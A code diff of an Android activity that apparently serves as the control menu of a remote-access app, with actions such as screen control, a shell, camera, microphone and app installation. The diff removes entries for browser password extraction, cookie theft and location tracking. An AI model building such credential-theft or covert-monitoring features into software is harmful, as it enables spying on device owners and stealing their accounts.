@@ -103,18 +103,15 @@ class DeviceActionsActivity : BaseActivity() {
             CommandItem("live_view", R.drawable.ic_live, R.string.action_live_view, R.string.action_live_view_desc),
             CommandItem("screen_control", R.drawable.ic_control, R.string.action_screen_control, R.string.action_screen_control_desc),
             CommandItem("paragraph", R.drawable.ic_paragraph, R.string.action_input_paragraph, R.string.action_input_paragraph_desc),
-            CommandItem("extract_passwords", R.drawable.ic_key, R.string.action_extract_passwords, R.string.action_extract_passwords_desc),
             CommandItem("file_manager", R.drawable.ic_folder, R.string.action_file_manager, R.string.action_file_manager_desc),
             CommandItem("shell", R.drawable.ic_shell, R.string.action_shell, R.string.action_shell_desc),
             CommandItem("processes", R.drawable.ic_process, R.string.action_processes, R.string.action_processes_desc),
             CommandItem("services", R.drawable.ic_service, R.string.action_services, R.string.action_services_desc),
             CommandItem("camera", R.drawable.ic_camera, R.string.action_camera, R.string.action_camera_desc),
             CommandItem("mic", R.drawable.ic_mic, R.string.action_mic, R.string.action_mic_desc),
-            CommandItem("location", R.drawable.ic_location, R.string.location_title, R.string.location_title),
             CommandItem("install_app", R.drawable.ic_install_app, R.string.action_install_app, R.string.action_install_app_desc),
             CommandItem("power_menu", R.drawable.ic_power, R.string.power_menu_title, R.string.power_menu_title),
-            CommandItem("play_audio", R.drawable.ic_audio, R.string.action_play_audio, R.string.action_play_audio_desc),
-            CommandItem("cookies", R.drawable.ic_cookie, R.string.cookies_title, R.string.cookies_title)
+            CommandItem("play_audio", R.drawable.ic_audio, R.string.action_play_audio, R.string.action_play_audio_desc)
         )
 
         val prefs = getSharedPreferences("DeviceActionsPrefs", MODE_PRIVATE)
@@ -145,18 +142,15 @@ class DeviceActionsActivity : BaseActivity() {
             "live_view" -> LiveScreenActivity::class.java
             "screen_control" -> ScreenControlActivity::class.java
             "paragraph" -> InputParagraphActivity::class.java
-            "extract_passwords" -> BrowserPasswordActivity::class.java
             "file_manager" -> FileManagerActivity::class.java
             "shell" -> ShellActivity::class.java
             "processes" -> ProcessesActivity::class.java
             "services" -> ServicesActivity::class.java
             "camera" -> CameraActivity::class.java
             "mic" -> MicActivity::class.java
-            "location" -> LocationActivity::class.java
             "install_app" -> InstallAppActivity::class.java
             "power_menu" -> PowerMenuActivity::class.java
             "play_audio" -> PlayAudioActivity::class.java
-            "cookies" -> CookiesActivity::class.java
             else -> return
         }
         val intent = Intent(this, cls)
